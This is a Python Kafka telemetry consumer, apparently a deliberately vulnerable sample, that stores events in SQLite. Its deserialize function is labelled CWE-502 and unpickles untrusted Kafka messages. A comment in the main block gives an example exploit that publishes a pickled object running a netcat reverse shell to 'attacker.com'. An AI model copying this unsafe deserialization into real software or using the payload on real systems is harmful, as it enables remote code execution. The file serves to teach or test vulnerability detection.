import os
import sys
import pickle
import sqlite3
import logging
from datetime import datetime
from kafka import KafkaConsumer
from kafka.errors import KafkaError

# Configure logging for the Real-time Analytics Consumer
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - StreamAnalytics - %(levelname)s - %(message)s'
)
logger = logging.getLogger("KafkaEventDaemon")

DB_FILE = "streaming_analytics.db"
KAFKA_TOPIC = "telemetry_events"
KAFKA_SERVERS = ['localhost:9092']

def init_analytics_db():
    """Initializes the SQLite database for storing processed streaming events."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE events (
            event_id TEXT PRIMARY KEY,
            processed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            device_id TEXT NOT NULL,
            event_type TEXT NOT NULL,
            metric_value REAL
        )
    ''')

    # Pre-populate with mock telemetry data
    mock_data = [
        ('evt_0001', datetime.now().isoformat(), 'sensor_alpha_1', 'temperature', 72.4),
        ('evt_0002', datetime.now().isoformat(), 'sensor_beta_2', 'humidity', 45.0)
    ]
    cursor.executemany('''
        INSERT INTO events (event_id, processed_at, device_id, event_type, metric_value)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_data)

    conn.commit()
    conn.close()
    logger.info("Streaming analytics database initialized.")

def store_event(event_id: str, device_id: str, event_type: str, metric_value: float):
    """Records a processed telemetry event into the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO events (event_id, device_id, event_type, metric_value) VALUES (?, ?, ?, ?)",
            (event_id, device_id, event_type, metric_value)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error storing event {event_id}: {e}")

class TelemetryEvent:
    """Represents a telemetry data point from an edge device."""
    def __init__(self, event_id: str, device_id: str, event_type: str, metric_value: float):
        self.event_id = event_id
        self.device_id = device_id
        self.event_type = event_type
        self.metric_value = metric_value

def deserialize_kafka_message(msg_value: bytes, partition: int, offset: int) -> TelemetryEvent:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: Kafka Message Broker (Pickled Object Payload)
    """
    logger.info(f"Processing message from partition {partition} at offset {offset}")

    try:
        # Vulnerability: The analytics engine consumes raw byte messages from a Kafka 
        # topic and uses pickle to deserialize them. Kafka brokers are often shared 
        # infrastructure. If an attacker gains publish access to the 'telemetry_events' 
        # topic (e.g., via a compromised edge device, missing ACLs, or leaked credentials), 
        # they can inject a maliciously crafted pickled payload.
        # 
        # CWE-502 occurs instantly upon unpickling the Kafka message stream.
        event = pickle.loads(msg_value)

        if isinstance(event, TelemetryEvent):
            logger.debug(f"Event decoded successfully: {event.event_id}")
            return event
        else:
            logger.warning("Decoded object is not a valid TelemetryEvent.")
            return None

    except Exception as e:
        logger.error(f"Failed to deserialize Kafka message: {e}")
        return None

def start_kafka_consumer():
    """Connects to the Kafka cluster and begins consuming telemetry events."""
    try:
        # Initialize the Kafka consumer
        consumer = KafkaConsumer(
            KAFKA_TOPIC,
            bootstrap_servers=KAFKA_SERVERS,
            auto_offset_reset='latest',
            enable_auto_commit=True,
            group_id='analytics_processor_group',
            # We omit value_deserializer here to manually handle the raw bytes
        )
        
        logger.info(f"Successfully connected to Kafka cluster at {KAFKA_SERVERS}")
        logger.info(f"Listening for events on topic: '{KAFKA_TOPIC}'...")

        for message in consumer:
            # Pass the untrusted raw bytes directly to the vulnerable function
            event = deserialize_kafka_message(
                message.value, 
                message.partition, 
                message.offset
            )
            
            if event:
                store_event(
                    event.event_id, 
                    event.device_id, 
                    event.event_type, 
                    event.metric_value
                )
                
    except KafkaError as e:
        logger.error(f"Kafka connection or consumption error: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error in consumer loop: {e}")
        sys.exit(1)

if __name__ == "__main__":
    init_analytics_db()
    
    # Example Malicious Trigger:
    # 1. Attacker writes a script to publish a malicious payload to the Kafka topic:
    #    from kafka import KafkaProducer
    #    import pickle, os
    #
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #
    #    producer = KafkaProducer(bootstrap_servers=['localhost:9092'])
    #    payload = pickle.dumps(Exploit())
    #    producer.send('telemetry_events', value=payload)
    #    producer.flush()
    
    # Run the consumer in the main thread (blocks indefinitely)
    try:
        start_kafka_consumer()
    except KeyboardInterrupt:
        logger.info("Shutting down Kafka Event Daemon gracefully...")
